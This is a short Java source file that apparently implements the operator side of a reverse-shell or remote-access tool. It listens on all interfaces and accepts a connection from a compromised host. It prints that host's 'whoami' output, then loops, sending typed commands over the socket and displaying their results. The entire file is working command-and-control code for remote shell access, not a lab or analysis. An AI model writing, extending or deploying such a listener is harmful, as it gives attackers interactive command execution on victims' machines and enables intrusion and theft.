package superman.server;

import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class SocketServer implements Runnable {
    private int port;

    public SocketServer(int port) {
        this.port = port;
    }

    private String readMessage(InputStream inputStream){
        try {
            int first = inputStream.read();
            if (first == -1) {
                return null;
            }
            int second = inputStream.read();
            int length = (first << 8) + second;
            byte[] bytes = new byte[length];
            inputStream.read(bytes);
            return new String(bytes, "UTF-8");
        } catch (Exception e) {

        }
        return null;
    }
    private void writeMessage(String message,OutputStream outputStream){
        try{
            byte[] sendBytes = message.getBytes("UTF-8");
            outputStream.write(sendBytes.length >>8);
            outputStream.write(sendBytes.length);
            outputStream.write(sendBytes);
            outputStream.flush();
        }catch (Exception e){

        }
    }
    @Override
    public void run() {
        try {
            ServerSocket serverSocket = new ServerSocket();
            serverSocket.bind(new InetSocketAddress(InetAddress.getByName("0.0.0.0"), port));
            Socket socket = serverSocket.accept();
            InetAddress address = socket.getInetAddress();
            Const.SHELL=true;
            System.out.println("[SOCKETSERVER]>> Log a connect to:" + address.getHostAddress());
            InputStream in=socket.getInputStream();
            System.out.println("[SOCKETSERVER]>> cmd:whoami,result:");
            System.out.println(readMessage(in));
            OutputStream out=socket.getOutputStream();
            Scanner scanner = new Scanner(System.in);
            while (true){
                System.out.println("[shell]>>input cmd:");
                String cmd = scanner.nextLine().trim();
                writeMessage(cmd,out);
                if(cmd.equals("exit")){
                    System.exit(1);
                }
                String result=readMessage(in);
                System.out.println("[shell]>> cmd :"+cmd+",result:");
                if(result!=null &&!result.equals("")){
                    System.out.println(result);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
